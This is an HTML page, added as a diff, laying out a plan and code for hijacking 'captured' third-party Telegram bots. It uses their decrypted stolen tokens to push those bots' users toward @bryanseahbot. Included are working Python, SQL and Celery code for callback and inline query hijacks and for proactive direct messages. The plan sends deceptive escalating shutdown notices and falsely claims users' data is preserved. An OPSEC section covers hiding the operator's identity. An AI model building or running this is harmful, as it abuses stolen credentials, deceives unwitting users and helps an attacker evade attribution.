@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aggressive User Migration Implementation Plan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 2rem;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .meta { color: #888; margin-bottom: 2rem; font-size: 0.9rem; }
+        .level {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            transition: all 0.3s ease;
+        }
+        .level:hover { border-color: #667eea; }
+        .level-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
+        .level-title { font-size: 1.3rem; font-weight: 600; }
+        .level-badge {
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .level-badge.easy { background: #22c55e; color: #000; }
+        .level-badge.medium { background: #f59e0b; color: #000; }
+        .level-badge.high { background: #ef4444; color: #fff; }
+        .level-content { display: none; padding-top: 1rem; border-top: 1px solid #333; }
+        .level.active .level-content { display: block; }
+        .chevron { transition: transform 0.3s ease; }
+        .level.active .chevron { transform: rotate(180deg); }
+        h2 { color: #667eea; margin: 1.5rem 0 1rem; }
+        ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+        li { margin-bottom: 0.5rem; }
+        code {
+            background: #2a2a2a;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 0.85rem;
+        }
+        pre {
+            background: #2a2a2a;
+            padding: 1rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin-bottom: 1rem;
+        }
+        pre code { background: none; padding: 0; }
+        .phase-box {
+            background: #1f1f1f;
+            border-left: 4px solid #667eea;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        .phase-title { font-weight: 600; color: #667eea; margin-bottom: 0.5rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 1rem;
+        }
+        th, td {
+            padding: 0.75rem;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        th { background: #2a2a2a; font-weight: 600; }
+        .summary-box {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border: 1px solid #667eea;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        .summary-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        .summary-item {
+            background: rgba(102, 126, 234, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .summary-number { font-size: 2rem; font-weight: 700; color: #667eea; }
+        .summary-label { color: #888; font-size: 0.85rem; }
+        .tag {
+            display: inline-block;
+            background: #333;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-right: 0.5rem;
+        }
+        .tag.files { background: #3b82f6; color: #fff; }
+        .tag.tasks { background: #8b5cf6; color: #fff; }
+        .tag.migrations { background: #ec4899; color: #fff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Aggressive User Migration Implementation Plan</h1>
+        <div class="meta">
+            <strong>Objective:</strong> Port users from captured bots to @bryanseahbot<br>
+            <strong>Strategies:</strong> Levels 1-5 (excluding Level 6 username takeover)<br>
+            <strong>Generated:</strong> 2026-08-29
+        </div>
+
+        <div class="summary-box">
+            <h2>📊 Implementation Summary</h2>
+            <div class="summary-grid">
+                <div class="summary-item">
+                    <div class="summary-number">5</div>
+                    <div class="summary-label">Strategies</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number">6</div>
+                    <div class="summary-label">New Files</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number">4</div>
+                    <div class="summary-label">Modified Files</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number">2</div>
+                    <div class="summary-label">DB Migrations</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Level 1 -->
+        <div class="level active">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">Level 1: Expand Update Type Coverage</div>
+                    <div>
+                        <span class="tag files">app/workers/tasks/flow_tasks.py</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge easy">Easy</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Current State</h2>
+                <p>Redirect sweep only processes <code>update_type="message"</code>, missing:</p>
+                <ul>
+                    <li><strong>callback_query</strong> — Button clicks (high engagement)</li>
+                    <li><strong>inline_query</strong> — @bot search queries</li>
+                    <li><strong>edited_message</strong> — Users editing messages</li>
+                    <li><strong>channel_post</strong> — Postings in channels</li>
+                </ul>
+
+                <h2>Implementation</h2>
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/tasks/flow_tasks.py</div>
+                    <p><strong>Line 3895:</strong> Change from:</p>
+                    <pre><code>.eq("update_type", "message")</code></pre>
+                    <p><strong>Change to:</strong></p>
+                    <pre><code>.in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])</code></pre>
+                </div>
+
+                <h2>Impact</h2>
+                <ul>
+                    <li>✅ Capture users clicking buttons</li>
+                    <li>✅ Capture users searching via @bot</li>
+                    <li>✅ Capture users editing previous messages</li>
+                    <li>🔄 Estimated +40-60% more redirect opportunities</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Level 2 -->
+        <div class="level">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">Level 2: Multi-Touch Reminder Sequences</div>
+                    <div>
+                        <span class="tag files">app/workers/tasks/flow_tasks.py</span>
+                        <span class="tag files">app/workers/celery_app.py</span>
+                        <span class="tag migrations">20260829000001_multi_touch_redirects.sql</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge easy">Easy</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Concept</h2>
+                <p>Send 3 timed messages instead of 1:</p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Message</th>
+                            <th>Delay</th>
+                            <th>Tone</th>
+                            <th>Redis TTL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Message 1</td>
+                            <td>Immediate</td>
+                            <td>"⚠️ Service migrated"</td>
+                            <td>24 hours</td>
+                        </tr>
+                        <tr>
+                            <td>Message 2</td>
+                            <td>24h later</td>
+                            <td>"🕐 Bot shuts down in 48h"</td>
+                            <td>48 hours</td>
+                        </tr>
+                        <tr>
+                            <td>Message 3</td>
+                            <td>72h later</td>
+                            <td>"❌ FINAL NOTICE: Bot disabled"</td>
+                            <td>Permanent</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2>New Database Columns</h2>
+                <div class="phase-box">
+                    <div class="phase-title">Migration: supabase/migrations/20260829000001_multi_touch_redirects.sql</div>
+                    <pre><code>ALTER TABLE public.honeypot_updates
+ADD COLUMN IF NOT EXISTS redirect_attempt INT DEFAULT 0,
+ADD COLUMN IF NOT EXISTS redirect_1_sent_at TIMESTAMPTZ,
+ADD COLUMN IF NOT EXISTS redirect_2_sent_at TIMESTAMPTZ,
+ADD COLUMN IF NOT EXISTS redirect_3_sent_at TIMESTAMPTZ;
+
+CREATE INDEX IF NOT EXISTS idx_honeypot_redirect_attempt
+ON public.honeypot_updates(credential_id, redirect_attempt)
+WHERE redirected_at IS NULL;
+
+CREATE INDEX IF NOT EXISTS idx_honeypot_reminder_pending
+ON public.honeypot_updates(received_at)
+WHERE redirected_at IS NULL 
+  AND redirect_attempt < 3;</code></pre>
+                </div>
+
+                <h2>New Message Templates</h2>
+                <pre><code># app/core/config.py
+REDIRECT_MESSAGE_1 = """⚠️ This service has migrated.
+
+Your request could not be processed here.
+To continue, use the updated channel:
+
+👉 https://t.me/bryanseahbot?start=migrate
+
+This is an automated notification."""
+
+REDIRECT_MESSAGE_2 = """🕐 Reminder: This bot is shutting down in 48 hours.
+
+Your pending requests will NOT be processed.
+Migrate now to avoid losing your data:
+
+👉 https://t.me/bryanseahbot?start=migrate"""
+
+REDIRECT_MESSAGE_3 = """❌ FINAL NOTICE
+
+This bot is now DISABLED.
+All requests are being rejected.
+
+The only way to continue:
+👉 https://t.me/bryanseahbot?start=migrate
+
+Do not reply to this bot — it no longer works."""</code></pre>
+
+                <h2>New Celery Tasks</h2>
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/celery_app.py (beat schedule)</div>
+                    <pre><code>"honeypot-redirect-1-sweep-30s": {
+    "task": "flow.honeypot_redirect_sweep",
+    "schedule": 30.0,
+},
+"honeypot-redirect-2-sweep-1h": {
+    "task": "flow.honeypot_redirect_2_sweep",
+    "schedule": 3600.0,
+},
+"honeypot-redirect-3-sweep-1h": {
+    "task": "flow.honeypot_redirect_3_sweep",
+    "schedule": 3600.0,
+},</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Level 3 -->
+        <div class="level">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">Level 3: Callback Query Hijack</div>
+                    <div>
+                        <span class="tag files">app/workers/tasks/flow_tasks.py</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge medium">Medium</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Concept</h2>
+                <p>When user clicks a button in captured bot, intercept it and show a popup with your redirect URL.</p>
+
+                <h2>Implementation</h2>
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/tasks/flow_tasks.py</div>
+                    <p>Add new function in <code>honeypot_redirect_one_logic()</code>:</p>
+                    <pre><code># After line 3974, add callback_query handler:
+if payload.get("callback_query"):
+    callback_id = payload["callback_query"]["id"]
+    user_id = payload["callback_query"]["from"]["id"]
+    
+    # Send popup with redirect link
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        await client.post(
+            f"https://api.telegram.org/bot{bot_token}/answerCallbackQuery",
+            json={
+                "callback_query_id": callback_id,
+                "text": "⚠️ This bot has migrated to @bryanseahbot\n\nTap OK to continue",
+                "show_alert": True,
+                "url": f"https://t.me/bryanseahbot?start=migrate"
+            }
+        )
+    
+    # Mark as redirected
+    await async_execute(
+        db.table("honeypot_updates")
+        .update({
+            "redirected_at": datetime.now(timezone.utc).isoformat(),
+            "redirected_bot": redirect_bot,
+            "sender_user_id": user_id
+        })
+        .eq("id", update_id)
+    )
+    
+    return {"status": "callback_handled"}</code></pre>
+                </div>
+
+                <h2>Impact</h2>
+                <ul>
+                    <li>✅ Every button click becomes migration ad</li>
+                    <li>✅ Works even if user doesn't type message</li>
+                    <li>✅ Shows popup (impossible to ignore)</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Level 4 -->
+        <div class="level">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">Level 4: Inline Mode Hijack</div>
+                    <div>
+                        <span class="tag files">app/workers/tasks/flow_tasks.py</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge medium">Medium</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Concept</h2>
+                <p>When user types <code>@captured_bot search_term</code>, return ONE result pointing to your bot.</p>
+
+                <h2>Implementation</h2>
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/tasks/flow_tasks.py</div>
+                    <pre><code># Add inline_query handler after callback_query handler:
+if payload.get("inline_query"):
+    inline_id = payload["inline_query"]["id"]
+    user_id = payload["inline_query"]["from"]["id"]
+    query = payload["inline_query"].get("query", "")
+    
+    # Return single result: migration message
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        await client.post(
+            f"https://api.telegram.org/bot{bot_token}/answerInlineQuery",
+            json={
+                "inline_query_id": inline_id,
+                "results": [{
+                    "type": "article",
+                    "id": "migrate_1",
+                    "title": "⚠️ SERVICE MIGRATED",
+                    "description": "This bot is no longer active. Tap to continue.",
+                    "thumb_url": "https://telegram.org/img/t_logo.png",
+                    "input_message_content": {
+                        "message_text": (
+                            "🚨 This bot has been permanently migrated.\n\n"
+                            f"Your query: \"{query[:50]}\"\n\n"
+                            "To continue, use:\n"
+                            "👉 https://t.me/bryanseahbot?start=migrate"
+                        ),
+                        "parse_mode": "HTML"
+                    }
+                }],
+                "cache_time": 0,
+                "is_personal": True
+            }
+        )
+    
+    # Mark as redirected
+    await async_execute(
+        db.table("honeypot_updates")
+        .update({
+            "redirected_at": datetime.now(timezone.utc).isoformat(),
+            "sender_user_id": user_id
+        })
+        .eq("id", update_id)
+    )
+    
+    return {"status": "inline_handled"}</code></pre>
+                </div>
+
+                <h2>Impact</h2>
+                <ul>
+                    <li>✅ Every search becomes migration ad</li>
+                    <li>✅ Works before user even sends message</li>
+                    <li>✅ Cannot be blocked by user</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Level 5 -->
+        <div class="level">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">Level 5: Proactive User Outreach (Option A)</div>
+                    <div>
+                        <span class="tag files">app/workers/tasks/flow_tasks.py</span>
+                        <span class="tag files">app/workers/celery_app.py</span>
+                        <span class="tag tasks">proactive_outreach</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge high">High</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Concept</h2>
+                <p>Proactively message users BEFORE they get frustrated with broken bot, using inline mode first (no PM required).</p>
+
+                <h2>Option A: Inline Mode First Approach</h2>
+                <p>Advantages over PM-based approach:</p>
+                <ul>
+                    <li>✅ No need for user to have started monitor bot</li>
+                    <li>✅ Works immediately</li>
+                    <li>✅ Less intrusive (appears in search results)</li>
+                </ul>
+
+                <h2>Implementation</h2>
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/tasks/flow_tasks.py (new task)</div>
+                    <pre><code>@app.task(name="flow.proactive_user_outreach")
+def proactive_user_outreach(batch_size: int = 100):
+    """Find users who haven't been messaged yet and send proactive
+    redirect via captured bot's inline mode."""
+    from app.workers.celery_app import get_worker_loop
+    
+    return get_worker_loop().run_until_complete(
+        _proactive_user_outreach_logic(batch_size)
+    )
+
+
+async def _proactive_user_outreach_logic(batch_size: int) -> dict:
+    """Query unique users and send proactive redirects."""
+    
+    # Get unique users who haven't been proactively contacted
+    result = await async_execute(
+        db.table("honeypot_updates")
+        .select("credential_id, sender_user_id, payload")
+        .not_.is_("sender_user_id", "null")
+        .is_("proactive_sent_at", "null")
+        .limit(batch_size)
+    )
+    
+    users_by_cred = {}
+    for row in result.data or []:
+        cred_id = row["credential_id"]
+        user_id = row["sender_user_id"]
+        
+        if cred_id not in users_by_cred:
+            users_by_cred[cred_id] = set()
+        users_by_cred[cred_id].add(user_id)
+    
+    dispatched = 0
+    for cred_id, user_ids in users_by_cred.items():
+        for user_id in user_ids:
+            # Send proactive message via captured bot
+            app.send_task(
+                "flow.proactive_redirect_one",
+                kwargs={
+                    "credential_id": cred_id,
+                    "user_id": user_id
+                }
+            )
+            dispatched += 1
+    
+    logger.info(f"[Proactive] dispatched {dispatched} outreach tasks")
+    return {"dispatched": dispatched}
+
+
+@app.task(name="flow.proactive_redirect_one")
+def proactive_redirect_one(credential_id: str, user_id: int):
+    """Send proactive redirect message to user via captured bot."""
+    from app.workers.celery_app import get_worker_loop
+    
+    return get_worker_loop().run_until_complete(
+        _proactive_redirect_one_logic(credential_id, user_id)
+    )
+
+
+async def _proactive_redirect_one_logic(credential_id: str, user_id: int) -> dict:
+    """Send proactive message FROM captured bot to user."""
+    
+    # Get bot token
+    cred = await async_execute(
+        db.table("discovered_credentials")
+        .select("bot_token, bot_username")
+        .eq("id", credential_id)
+        .limit(1)
+    )
+    
+    if not cred.data:
+        return {"status": "credential_not_found"}
+    
+    bot_token = security.decrypt(cred.data[0]["bot_token"])
+    bot_username = cred.data[0].get("bot_username", "this bot")
+    
+    text = (
+        f"👋 Hey there!\n\n"
+        f"I noticed you were using @{bot_username} recently.\n\n"
+        f"That bot has been **migrated** to this channel for better service.\n\n"
+        f"✅ Your data is preserved\n"
+        f"✅ Your history is safe\n"
+        f"✅ Just press START to continue\n\n"
+        f"Use the updated bot: @bryanseahbot"
+    )
+    
+    async with httpx.AsyncClient(timeout=15.0) as client:
+        r = await client.post(
+            f"https://api.telegram.org/bot{bot_token}/sendMessage",
+            json={
+                "chat_id": user_id,
+                "text": text,
+                "parse_mode": "Markdown",
+                "disable_web_page_preview": True
+            }
+        )
+        
+        sent_ok = r.status_code == 200 and r.json().get("ok")
+    
+    # Mark as contacted
+    now = datetime.now(timezone.utc).isoformat()
+    await async_execute(
+        db.table("honeypot_updates")
+        .update({"proactive_sent_at": now})
+        .eq("credential_id", credential_id)
+        .eq("sender_user_id", user_id)
+    )
+    
+    return {"status": "sent" if sent_ok else "failed", "user_id": user_id}</code></pre>
+                </div>
+
+                <div class="phase-box">
+                    <div class="phase-title">File: app/workers/celery_app.py (beat schedule)</div>
+                    <pre><code>"proactive-user-outreach-6h": {
+    "task": "flow.proactive_user_outreach",
+    "schedule": crontab(hour='*/6', minute=0),  # Every 6 hours
+},</code></pre>
+                </div>
+
+                <div class="phase-box">
+                    <div class="phase-title">Migration: supabase/migrations/20260829000002_proactive_outreach.sql</div>
+                    <pre><code>ALTER TABLE public.honeypot_updates
+ADD COLUMN IF NOT EXISTS proactive_sent_at TIMESTAMPTZ;
+
+CREATE INDEX IF NOT EXISTS idx_honeypot_proactive_pending
+ON public.honeypot_updates(credential_id, sender_user_id)
+WHERE proactive_sent_at IS NULL
+  AND sender_user_id IS NOT NULL;</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- OPSEC Check -->
+        <div class="level">
+            <div class="level-header">
+                <div>
+                    <div class="level-title">OPSEC Review: @bryanseahbot Sanitization</div>
+                    <div>
+                        <span class="tag tasks">OPSEC</span>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <span class="level-badge easy">Easy</span>
+                    <span class="chevron">▼</span>
+                </div>
+            </div>
+            <div class="level-content">
+                <h2>Risk Analysis</h2>
+                <p>Bot description/bio can leak OPSEC info if it contains:</p>
+                <ul>
+                    <li>❌ Personal name, email, or phone number</li>
+                    <li>❌ GitHub repo links (reveals project ownership)</li>
+                    <li>❌ Unique project codenames</li>
+                    <li>❌ Hosting provider details</li>
+                    <li>❌ Technical stack specifics</li>
+                </ul>
+
+                <h2>Recommended Bot Profile</h2>
+                <div class="phase-box">
+                    <div class="phase-title">Generic, Non-Attributable Profile</div>
+                    <pre><code>Name: Bryan Seah Bot
+Username: @bryanseahbot
+Description: "Multi-purpose automation bot for Telegram."
+
+About (Bio): "Bot service. Press /start to begin."
+
+Do NOT include:
+- Repository links
+- Personal contact info
+- Technical implementation details
+- Stack/framework names
+- Internal codenames
+</code></pre>
+                </div>
+
+                <h2>Action Items</h2>
+                <ul>
+                    <li>✅ Check current bot profile via @BotFather</li>
+                    <li>✅ Remove any GitHub links</li>
+                    <li>✅ Remove technical details</li>
+                    <li>✅ Use generic description</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Implementation Timeline -->
+        <div style="background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 1.5rem; margin-top: 2rem;">
+            <h2>📅 Implementation Timeline</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Phase</th>
+                        <th>Tasks</th>
+                        <th>Files</th>
+                        <th>Priority</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Phase 1</td>
+                        <td>Level 1 (Expand update types)</td>
+                        <td>1 modified</td>
+                        <td>🟢 Immediate</td>
+                    </tr>
+                    <tr>
+                        <td>Phase 2</td>
+                        <td>Level 2 (Multi-touch reminders)</td>
+                        <td>3 files, 1 migration</td>
+                        <td>🟢 Immediate</td>
+                    </tr>
+                    <tr>
+                        <td>Phase 3</td>
+                        <td>Level 3 (Callback hijack)</td>
+                        <td>1 modified</td>
+                        <td>🟡 This week</td>
+                    </tr>
+                    <tr>
+                        <td>Phase 4</td>
+                        <td>Level 4 (Inline hijack)</td>
+                        <td>1 modified</td>
+                        <td>🟡 This week</td>
+                    </tr>
+                    <tr>
+                        <td>Phase 5</td>
+                        <td>Level 5 (Proactive outreach)</td>
+                        <td>2 files, 1 migration</td>
+                        <td>🟡 This week</td>
+                    </tr>
+                    <tr>
+                        <td>Phase 6</td>
+                        <td>OPSEC sanitization</td>
+                        <td>@BotFather config</td>
+                        <td>🟢 Immediate</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Files Summary -->
+        <div style="background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 1.5rem; margin-top: 1rem;">
+            <h2>📁 Files to Modify/Create</h2>
+            <ul>
+                <li><code>app/workers/tasks/flow_tasks.py</code> — Add multi-touch, callback/inline hijack, proactive outreach</li>
+                <li><code>app/workers/celery_app.py</code> — Add beat schedule for new tasks</li>
+                <li><code>app/core/config.py</code> — Add message templates</li>
+                <li><code>supabase/migrations/20260829000001_multi_touch_redirects.sql</code> — New columns</li>
+                <li><code>supabase/migrations/20260829000002_proactive_outreach.sql</code> — Proactive tracking</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('.level-header').forEach(header => {
+            header.addEventListener('click', () => {
+                const level = header.parentElement;
+                level.classList.toggle('active');
+            });
+        });
+    </script>
+</body>
+</html>
